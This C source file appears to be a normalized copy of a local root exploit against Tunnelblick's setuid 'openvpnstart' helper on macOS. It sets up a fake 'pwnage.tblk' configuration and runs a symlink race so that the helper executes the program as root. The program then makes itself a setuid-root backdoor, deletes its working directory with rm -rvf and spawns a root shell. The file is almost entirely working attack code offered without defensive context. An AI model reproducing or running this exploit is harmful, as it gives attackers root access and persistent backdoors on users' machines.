
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






typedef int uint32_t ;
typedef int script ;
typedef int pid_t ;
typedef int pid_file ;
typedef int path ;
typedef int dir ;
typedef int command ;
typedef int FILE ;


 int S_ISUID ;
 int S_IXOTH ;
 int _NSGetExecutablePath (char*,int*) ;
 int chmod (char*,int) ;
 int chown (char*,int ,int ) ;
 int close (int) ;
 int execl (char*,char*,char*,...) ;
 int fclose (int *) ;
 int * fopen (char*,char*) ;
 int fork () ;
 int fprintf (int *,char*,int,int) ;
 int fscanf (int *,char*,int*,int*) ;
 char* getenv (char*) ;
 int geteuid () ;
 int getpid () ;
 int kill (int,int) ;
 int printf (char*) ;
 int realpath (char*,char*) ;
 int setenv (char*,char*,int) ;
 int setgid (int ) ;
 int setuid (int ) ;
 int snprintf (char*,int,char*,char*) ;
 int strcpy (char*,char*) ;
 int symlink (char*,char*) ;
 int system (char*) ;
 int unlink (char*) ;
 int wait (int *) ;

int main(int argc, char *argv[])
{
 char dir[512];
 char script[512];
 char command[512];
 char pid_file[512];
 char path[512];
 char self[512];
 uint32_t size;
 pid_t pid, pid2;
 FILE *file;

 snprintf(dir, sizeof(dir), "%s/Library/Application Support/Tunnelblick/Configurations/pwnage.tblk/Contents/Resources", getenv("HOME"));
 snprintf(pid_file, sizeof(pid_file), "%s/exploit.pid", dir);


 if (getenv("PWNPATH"))
  strcpy(self, getenv("PWNPATH"));
 else {
  size = sizeof(path);
  _NSGetExecutablePath(path, &size);
  realpath(path, self);
  setenv("PWNPATH", self, 1);
 }

 if (!geteuid()) {
  file = fopen(pid_file, "r");
  if (file) {
   printf("[+] Making backdoor.\n");
   chown(self, 0, 0);
   chmod(self, S_ISUID | S_IXOTH);

   printf("[+] Cleaning up.\n");
   fscanf(file, "%d %d", &pid, &pid2);
   fclose(file);
   snprintf(command, sizeof(command), "rm -rvf '%s/../../../'", dir);
   system(command);

   printf("[+] Complete. Run this again to get root.\n");
   kill(pid2, 9);
   kill(pid, 9);
   return 0;
  }
  printf("[+] Getting root.\n");
  setuid(0);
  setgid(0);
  execl("/bin/bash", "bash", ((void*)0));
 }


 printf("[+] Creating vulnerable directory.\n");
 snprintf(command, sizeof(command), "mkdir -p -v '%s'", dir);
 system(command);

 pid = fork();
 if (!pid) {
  printf("[+] Running toggler.\n");
  snprintf(script, sizeof(script), "%s/connected.sh", dir);
  for (;;) {
   unlink(script);
   symlink("/Applications/Tunnelblick.app/Contents/Resources/client.down.tunnelblick.sh", script);
   unlink(script);
   symlink(self, script);
  }
 } else {
  printf("[+] Writing pid and executing vulnerable program.\n");
  file = fopen(pid_file, "w");
  fprintf(file, "%d %d", pid, getpid());
  fclose(file);
  for (;;) {
   if (fork())
    wait(((void*)0));
   else {
    close(0);
    close(2);
    execl("/Applications/Tunnelblick.app/Contents/Resources/openvpnstart", "openvpnstart", "connected", "pwnage.tblk", "0", ((void*)0));
   }
  }
 }

 return 0;
}
